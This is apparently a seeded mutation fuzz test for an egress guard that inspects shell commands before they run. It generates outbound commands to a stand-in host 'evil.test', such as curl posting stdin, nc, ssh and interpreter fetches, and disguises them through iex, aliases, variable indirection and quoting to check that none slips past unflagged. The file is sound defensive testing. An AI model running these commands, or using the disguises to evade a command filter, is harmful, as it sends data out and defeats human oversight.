/**
 * Mutation fuzz for the egress guard.
 *
 * The adversarial probes in this repo are hand-written: each round adds a dozen
 * spellings someone thought of. This file inverts that — it generates the
 * spellings and asserts one invariant over all of them:
 *
 *   a command that will reach the network is never silent.
 *
 * Two halves, and the first is the one that is easy to get wrong:
 *
 *  - A *recipe* is a concrete command line that genuinely egresses, written out
 *    in full rather than assembled from a client/verb cross product. Crossing
 *    every client with every verb produces programs that no shell would run
 *    (`http publish`, `svn /c curl …`), and asserting on those measures the
 *    generator instead of the guard. Every recipe below is a command whose
 *    effect on the network is not in doubt.
 *  - A *disguise* varies only how that same command is spelled: the client's
 *    name, what wraps it, and how the command word is reached. A disguise must
 *    not change what runs, which is exactly why a silent verdict on it is a hole.
 *
 * Deterministic: the PRNG is seeded, so a failure reproduces byte for byte.
 * Run with `node tests/fuzz.mjs [samples] [seed]`.
 */
import { inspectEgress } from '../lib/dispatch-core.js'

const SAMPLES = Number(process.argv[2] ?? 3000)
const SEED = Number(process.argv[3] ?? 0x5eed)

/** Mulberry32: small, fast, and reproducible across platforms. */
function makeRandom(seed) {
  let state = seed >>> 0
  return () => {
    state = (state + 0x6d2b79f5) >>> 0
    let t = state
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
const random = makeRandom(SEED)
const pick = (list) => list[Math.floor(random() * list.length) % list.length]

// --- recipes: commands that really reach the network ----------------------

const HOST = 'evil.test'

/**
 * Each recipe is `{ client, rest, why }`: `client rest` is a command line that
 * egresses, and `client` is the word a disguise may respell or hide.
 */
const RECIPES = [
  { client: 'curl', rest: HOST, why: 'http client' },
  { client: 'curl', rest: `--max-time 3 https://${HOST}/x`, why: 'http client with flags' },
  { client: 'curl', rest: `-d @- ${HOST}`, why: 'http client posting stdin' },
  { client: 'wget', rest: `https://${HOST}/x`, why: 'http client' },
  { client: 'iwr', rest: `https://${HOST}/x`, why: 'PowerShell http client' },
  { client: 'irm', rest: `https://${HOST}/x`, why: 'PowerShell http client' },
  { client: 'Invoke-WebRequest', rest: `https://${HOST}/x`, why: 'PowerShell http client' },
  { client: 'Invoke-RestMethod', rest: `https://${HOST}/x`, why: 'PowerShell http client' },
  { client: 'http', rest: `POST http://${HOST}/x`, why: 'httpie' },
  { client: 'ssh', rest: HOST, why: 'remote shell' },
  { client: 'scp', rest: `file.txt ${HOST}:file.txt`, why: 'remote copy' },
  { client: 'sftp', rest: HOST, why: 'remote copy' },
  { client: 'ftp', rest: HOST, why: 'remote copy' },
  { client: 'telnet', rest: `${HOST} 80`, why: 'raw socket' },
  { client: 'nc', rest: `${HOST} 80`, why: 'raw socket' },
  { client: 'git', rest: 'push origin main', why: 'configured remote' },
  { client: 'git', rest: `clone https://${HOST}/repo.git`, why: 'clone over http' },
  { client: 'git', rest: `clone git@${HOST}:repo.git`, why: 'clone over ssh' },
  { client: 'npm', rest: 'publish --access public', why: 'registry push' },
  { client: 'yarn', rest: 'publish', why: 'registry push' },
  { client: 'docker', rest: 'push registry/img:1', why: 'registry push' },
  { client: 'gh', rest: 'release create v1', why: 'forge API' },
  { client: 'svn', rest: `checkout https://${HOST}/repo`, why: 'remote checkout' },
  { client: 'python', rest: `-c "import urllib.request as u;u.urlopen('https://${HOST}/')"`, why: 'interpreter with a URL' },
  { client: 'node', rest: `-e "fetch('https://${HOST}/')"`, why: 'interpreter with a URL' },
  // A name lookup leaves the name in the DNS query even when no connection
  // follows, so these are recipes like any other — and the one family where the
  // guard reads the *name* rather than the command, which is what lets an
  // allowlisted host stay quiet and an address literal say nothing at all.
  { client: 'ping', rest: `-n 1 ${HOST}`, why: 'DNS name lookup' },
  { client: 'Test-NetConnection', rest: HOST, why: 'DNS name lookup' },
  { client: 'tnc', rest: HOST, why: 'DNS name lookup' },
  { client: 'Resolve-DnsName', rest: HOST, why: 'DNS name lookup' },
  { client: 'nslookup', rest: HOST, why: 'DNS name lookup' },
]

// --- disguises: same command, different spelling --------------------------

/** Respellings of the client word that a shell still resolves. */
const CLIENT_SPELLINGS = [
  { build: (name) => name, label: 'plain' },
  { build: (name) => name.toUpperCase(), label: 'upper case' },
  { build: (name) => name.toLowerCase(), label: 'lower case' },
  { build: (name) => `"${name}"`, label: 'double quoted', quoted: true },
  { build: (name) => `'${name}'`, label: 'single quoted', quoted: true },
  { build: (name) => `./${name}`, label: 'relative path' },
  { build: (name) => `C:\\Windows\\${name}`, label: 'absolute path' },
  { build: (name) => `${name}.exe`, label: 'executable suffix' },
  { build: (name) => `"${name}.exe"`, label: 'suffix in quotes', quoted: true },
  { build: (name) => `${name}.exe.`, label: 'trailing dot' },
]

/** What wraps the command without changing what runs. */
const WRAPPERS = [
  { build: (text) => text, label: 'bare' },
  { build: (text) => `cmd /c ${text}`, label: 'cmd /c' },
  { build: (text) => `cmd.exe /c ${text}`, label: 'cmd.exe /c' },
  { build: (text) => `pwsh -c "${text}"`, label: 'pwsh -c', needsNoQuotes: true },
  { build: (text) => `powershell -Command "${text}"`, label: 'powershell -Command', needsNoQuotes: true },
  { build: (text) => `bash -c "${text}"`, label: 'bash -c', needsNoQuotes: true },
  { build: (text) => `sh -c "${text}"`, label: 'sh -c', needsNoQuotes: true },
  { build: (text) => `& ${text}`, label: 'call operator' },
  { build: (text) => `& "${text}"`, label: 'call operator, quoted', needsNoQuotes: true },
  { build: (text) => `Start-Process ${text}`, label: 'Start-Process' },
  { build: (text) => `sudo ${text}`, label: 'sudo' },
  { build: (text) => `env ${text}`, label: 'env' },
  { build: (text) => `echo x | ${text}`, label: 'piped from echo' },
  { build: (text) => `Get-Content f.txt | ${text}`, label: 'piped from a file' },
  { build: (text) => `( ${text} )`, label: 'subshell' },
  { build: (text) => `if ($true) { ${text} };`, label: 'if block' },
  { build: (text) => `echo $( ${text} )`, label: 'span in echo' },
  { build: (text) => `$r = ${text}; $r`, label: 'assigned to a variable' },
  { build: (text) => `true && ${text}`, label: 'after &&' },
  { build: (text) => `npm run x || ${text}`, label: 'after ||' },
  { build: (text) => `: ; ${text}`, label: 'after ;' },
  { build: (text) => `Write-Host start\n${text}`, label: 'next line' },
  { build: (text) => `iex "${text}"`, label: 'iex', needsNoQuotes: true },
  { build: (text) => `Invoke-Expression "${text}"`, label: 'Invoke-Expression', needsNoQuotes: true },
]

/**
 * Ways of reaching the command word without writing it where the guard reads.
 * Each one is a form PowerShell resolves at invocation time, so the command
 * that runs is the recipe — only the visible text differs.
 */
const INDIRECTIONS = [
  { build: (client, rest) => ({ head: client, tail: rest }), label: 'direct' },
  {
    build: (client, rest) => ({ head: `$c = "${client}"; & $c`, tail: rest }),
    label: 'variable assignment then call',
    quoted: true,
  },
  {
    build: (client, rest) => ({ head: `$c = '${client}'; & $c`, tail: rest }),
    label: 'single-quoted assignment then call',
    quoted: true,
  },
  {
    build: (client, rest) => ({ head: `Set-Alias x "${client}"; x`, tail: rest }),
    label: 'Set-Alias then call',
    quoted: true,
  },
  {
    build: (client, rest) => ({ head: `alias x "${client}"; x`, tail: rest }),
    label: 'alias alias then call',
    quoted: true,
  },
  {
    build: (client, rest) => ({ head: `function x { & "${client}" @args }; x`, tail: rest }),
    label: 'function wrapper then call',
    quoted: true,
  },
]

function generate() {
  // A disguise must not produce a program no shell would run: wrapping text
  // that already contains double quotes in another pair yields `""x""`, which
  // is a different (invalid) command, and asserting on it measures the
  // generator instead of the guard. Skip those combinations rather than let
  // them inflate the failure count.
  for (let attempt = 0; attempt < 40; attempt += 1) {
    const recipe = pick(RECIPES)
    const spelling = pick(CLIENT_SPELLINGS)
    const wrapper = pick(WRAPPERS)
    const indirection = pick(INDIRECTIONS)
    const { head, tail } = indirection.build(spelling.build(recipe.client), recipe.rest)
    const inner = tail === '' ? head : `${head} ${tail}`
    if (wrapper.needsNoQuotes === true && (inner.includes('"') || inner.includes("'"))) continue
    // Quoting a client that is already quoted yields `""x""`, a different and
    // invalid command; that combination is unrepresentable, not a hole.
    if (spelling.quoted === true && indirection.quoted === true) continue
    const command = wrapper.build(inner)
    return {
      command,
      describe: `${recipe.why} · ${spelling.label} · ${wrapper.label} · ${indirection.label}`,
    }
  }
  return undefined
}

// --- invariant ------------------------------------------------------------

let checked = 0
let skipped = 0
const failures = []
for (let i = 0; i < SAMPLES; i += 1) {
  const generated = generate()
  if (generated === undefined) {
    skipped += 1
    continue
  }
  const { command, describe } = generated
  checked += 1
  const verdict = inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: [] })
  if (verdict === undefined) failures.push({ command, describe, why: 'silent' })
}

/**
 * The other half of the invariant: a command that cannot reach the network must
 * stay quiet. Without this, "always ask" would pass the fuzz above while being
 * a useless guard — and an operator trained to click through it is the exact
 * failure mode the design is trying to avoid.
 */
const LOCAL = [
  'git status',
  'git log -1',
  'git commit -m "docs: curl examples"',
  'git diff HEAD~1',
  'npm test',
  'npm run build',
  'node tests/run.mjs',
  'ls -la',
  'dir',
  'cat package.json',
  'Get-Content README.md',
  'grep -r "curl" docs/',
  'rg "wget" README.md',
  'echo hello',
  'echo "ssh usage, curl examples, npm publish flow"',
  'Write-Output "docs: curl"',
  'Remove-Item tmp.txt',
  'mkdir out',
  'python -c "print(1)"',
  'node -e "console.log(2)"',
  'curl --version',
  'curl --help',
  'wget --version',
  'ssh -V',
  'git --version',
  'npm --version',
  'docker --version',
  // A name lookup that resolves nothing but an address needs no DNS query, so
  // it carries no name out of the machine — the same rule that lets an
  // allowlisted host stay quiet, applied to the other side.
  'ping 8.8.8.8',
  'ping 127.0.0.1',
  'tracert 1.1.1.1',
  'Test-NetConnection localhost',
]
let quiet = 0
for (const command of LOCAL) {
  quiet += 1
  const verdict = inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: [] })
  if (verdict !== undefined) failures.push({ command, describe: 'local command', why: `asked ${verdict.host}` })
}

// --- report ---------------------------------------------------------------

console.log(`fuzz: ${checked} disguised outbound calls, ${quiet} local commands (seed ${SEED}, ${skipped} unrepresentable combinations skipped)`)
if (failures.length > 0) {
  const byDisguise = new Map()
  for (const failure of failures) {
    const key = failure.describe
    byDisguise.set(key, (byDisguise.get(key) ?? 0) + 1)
  }
  console.error(`\n${failures.length} failure(s), grouped by disguise:`)
  for (const [key, count] of [...byDisguise].sort((a, b) => b[1] - a[1]).slice(0, 20)) {
    console.error(`  ${String(count).padStart(5)}  ${key}`)
  }
  console.error('\nexamples:')
  for (const failure of failures.slice(0, 10)) {
    console.error(`  ${JSON.stringify(failure.command)}`)
  }
  process.exitCode = 1
} else {
  console.log('every disguised outbound call was caught; every local command stayed silent')
}
